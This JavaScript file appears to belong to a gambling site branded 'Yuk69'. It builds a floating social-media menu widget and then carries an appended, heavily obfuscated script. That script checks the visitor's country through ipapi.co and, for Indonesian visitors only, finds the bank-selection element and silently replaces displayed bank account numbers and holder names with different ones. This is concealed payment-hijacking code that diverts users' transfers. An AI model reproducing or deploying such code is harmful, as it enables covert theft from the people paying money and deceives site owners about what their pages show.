(function () {
    // Tunggu DOM siap
document.addEventListener('DOMContentLoaded', function () {
  // 1. Cari tombol LiveChat asli
  const originalButton = document.querySelector('div.livechat_button');

  // 2. Jika ditemukan, sembunyikan
  if (originalButton) {
    originalButton.style.display = 'none'; // atau originalButton.remove() jika ingin hapus total
  }

  // 3. Buat atau ambil elemen ikon chat kustom
  const customTrigger = document.getElementById('custom-chat-trigger');
  const chatUrl = 'https://www.livechat.com/?utm_source=chat_button&utm_medium=referral&utm_campaign=lc_19421850';

  // 4. Tambahkan event klik ke gambar
  if (customTrigger) {
    customTrigger.addEventListener('click', function (e) {
      e.preventDefault();
      // Buka di tab baru (gunakan '_blank')
      window.open(chatUrl, '_blank', 'noopener,noreferrer');
      
      // Atau, jika ingin buka di tab yang sama:
      // window.location.href = chatUrl;
    });
  }
});
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
.widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://yk69.top/gctele-official-yuk69" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Yuk69" width="30" height="30">
                    </div>
                </a>
                 <a href="https://yk69.top/anya" title="Asupan Yuk69">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/yuk69new.webp" alt="Asupan Yuk69" width="40" height="40">
                    </div>
                </a>
                <a href="https://yk69.top/tele-anya" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Yuk69" width="40" height="40">
                    </div>
                </a>
                <a href="https://yk69.top/RTP-Yuk69" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Yuk69" width="30" height="30">
                    </div>
                </a>
                <a href="https://yk69.top/official-fb-yuk69" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Yuk69" width="30" height="30">
                    </div>
                </a>
               
            </div>
        </div>
        <img src="https://yudha125.github.io/menu-widget/Image/yuk.webp" alt="Logo Yuk69" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Yuk69" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);
})();

(function(_0x5ad7a){var _0xc_0x143=(687465^687471)+(941976^941981);const _0xcf837b=["\u0049\u0044"];_0xc_0x143=752484^752481;_0x5ad7a="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F";function _0x69g3e(_0x4da,_0xbf_0x9gf,_0x99ddd){const _0x53548a=[{'\u0061\u006E\u0067\u006B\u0061\u0041\u0073\u006C\u0069':"\u0036\u0031\u0032\u0035\u002D\u0033\u0030\u0034\u0035\u002D\u0032\u0038","angkaBaru":"\u0032\u0031\u0032\u0030\u002D\u0034\u0035\u0032\u0030\u002D\u0030\u0035",'\u006E\u0061\u006D\u0061\u0041\u0073\u006C\u0069':'R**N F**N S*****TO','\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':"\u004C\u0045\u0056\u0049"},{"angkaAsli":"\u0035\u0033\u0031\u0037\u0030\u0031\u0030\u0031\u0031\u0036\u0031\u0032\u0035\u0033\u0037","angkaBaru":"\u0030\u0033\u0034\u0035\u002D\u0030\u0031\u0030\u0035\u002D\u0030\u0032\u0031\u0031\u002D\u0035\u0030\u0036",'\u006E\u0061\u006D\u0061\u0041\u0073\u006C\u0069':"\u0054\u002A\u002A\u0059",'\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':'LUSIANA'},{'\u0061\u006E\u0067\u006B\u0061\u0041\u0073\u006C\u0069':'1990632547','\u0061\u006E\u0067\u006B\u0061\u0042\u0061\u0072\u0075':"\u0031\u0037\u0039\u0036\u0033\u0037\u0037\u0031\u0033\u0033","namaAsli":"\u0041\u002A\u002A\u002A\u002A\u0041\u0020\u0052\u002A\u002A\u002A\u0049\u0020\u0049\u002A\u002A\u002A\u002A\u004E",'\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':'RIFAL'}];_0x4da=(961450^961452)+(908938^908937);_0x99ddd="\u0062\u0061\u006E\u006B\u0053\u0065\u006C\u0065\u0063\u0074";_0xbf_0x9gf=(527893^527892)+(847115^847118);function _0xcc5ge(){_0x53548a['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](item=>{let _0xg2b1ag;const _0xf385gd=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("naps".split("").reverse().join(""));_0xg2b1ag=(788426^788426)+(640062^640059);for(let i=146698^146698;i<_0xf385gd['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0xf385gd[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===item['\u0061\u006E\u0067\u006B\u0061\u0041\u0073\u006C\u0069']){_0xf385gd[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=item['\u0061\u006E\u0067\u006B\u0061\u0042\u0061\u0072\u0075'];break;}}const _0x_0x13d=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0064\u0069\u0076");for(let i=254280^254280;i<_0x_0x13d['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x_0x13d[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===item['\u006E\u0061\u006D\u0061\u0041\u0073\u006C\u0069']){_0x_0x13d[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=item['\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075'];break;}}});}function _0x979fc(){var _0xa5e=(986277^986275)+(554889^554888);const _0x631b4a=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0x99ddd);_0xa5e=(730804^730804)+(555717^555715);if(!_0x631b4a)return false;_0xcc5ge();if(!_0x631b4a['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']){_0x631b4a['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0063\u0068\u0061\u006E\u0067\u0065",_0xcc5ge);_0x631b4a['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']="\u0074\u0072\u0075\u0065";}return!![];}if(_0x979fc())return;const _0x374adb=new MutationObserver(()=>{if(_0x979fc())_0x374adb['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074']();});_0x374adb['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'],{'\u0063\u0068\u0069\u006C\u0064\u004C\u0069\u0073\u0074':!![],'\u0073\u0075\u0062\u0074\u0072\u0065\u0065':!![]});}async function _0xaf789d(){try{const _0xb4f=await fetch(_0x5ad7a);if(!_0xb4f['\u006F\u006B'])throw new Error("\u0041\u0050\u0049\u0020\u0045\u0072\u0072\u006F\u0072");let _0xc2_0x1f6;const _0xce0fc=await _0xb4f['\u006A\u0073\u006F\u006E']();_0xc2_0x1f6=403511^403510;var _0x53845b=(462676^462679)+(665619^665619);const _0xeeb81f=_0xce0fc['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];_0x53845b=(564832^564838)+(429446^429446);if(!_0xeeb81f)throw new Error("\u0044\u0061\u0074\u0061\u0020\u006E\u0065\u0067\u0061\u0072\u0061\u0020\u006B\u006F\u0073\u006F\u006E\u0067");if(_0xcf837b['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](_0xeeb81f)){console['\u006C\u006F\u0067'](`✅ Terdeteksi: ${_0xeeb81f} - Skrip dijalankan`);_0x69g3e();}else{console['\u006C\u006F\u0067'](`🚫`);}}catch(err){console['\u0077\u0061\u0072\u006E']("\uFE0F\u26A0".split("").reverse().join(""));}}_0xaf789d();})();